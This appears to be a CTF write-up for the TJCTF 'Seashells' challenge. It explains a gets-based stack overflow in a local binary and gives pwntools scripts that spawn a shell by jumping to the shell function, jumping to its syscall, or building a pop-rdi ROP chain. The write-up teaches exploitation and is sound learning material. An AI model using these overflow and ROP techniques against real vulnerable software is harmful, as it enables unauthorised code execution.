---
tags: [TJCTF]
title: Seashells
created: '2020-05-31T09:33:56.008Z'
modified: '2020-05-31T10:53:43.070Z'
---

# Seashells
## Solving
- There is a function `shell` at `0x4006c7`, which when called with $param1 = 0xdeadcafebabebeef$, will spawn a `/bin/sh` shell.
- There is a `gets` into buffer `local_12`, which is $10$ bytes big.
- With a pattern, we found that the offset to the first return is $18$ bytes.

We can now do 2 things
- Jump to syscall, skipping the check for the parameter in the `shell function`
  - Jump straight to `0x4006e3`
- Create a ROP chain to set the first parameter correctly
  - After successfully calling the shell function, we need to put $0xdeadcafebabebeef$ into $rdi$. We can do that by finding a `pop rdi; ret` gadget and putting that in the payload, followed by $0xdeadcafebabebeef$ and the return address for the `shell` function
## Commands
- `file seashells`: `seashells: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=3621729c49fe5cebe2153c267fbdf4adb70b0eec, not stripped`
- `checksec`: `NX` and `RELRO`
### Finding offset to return after BoF
`pattern create 256`
`pattern search`

## Exploit
### Jump to beginning shell function
```bash
python -c "import pwn; print(
  'a' * 18 + # Padding
  pwn.p64(0x4006c7)
);" > input.txt
```
### Jump to syscall
```python
#!/usr/bin/env python3

from pwn import *

def main():
	io = process('seashells')

	padding = b'a' * 18
	syscall = p64(0x4006e3)

	payload = padding + syscall

	io.recvuntil('Would you like a shell?')
	io.sendline(payload)
	io.interactive()


if __name__ == '__main__':
	main()
```
### ROPChain
```python
#!/usr/bin/env python3

from pwn import *


def main():
	# context.log_level = 'DEBUG'

	file = './seashells'
	io = process(file)
	binary = ELF(file)
	rop = ROP(file)

	padding = b'a' * 18
	pop_rdi = p64(rop.find_gadget(['pop rdi', 'ret'])[0])
	deadcafebabebeef = p64(0xDEADCAFEBABEBEEF)
	shell_function = p64(binary.symbols['shell'])

	payload = padding + pop_rdi + deadcafebabebeef + shell_function

	io.sendlineafter('Would you like a shell?', payload)
	io.interactive()


if __name__ == '__main__':
	main()

```
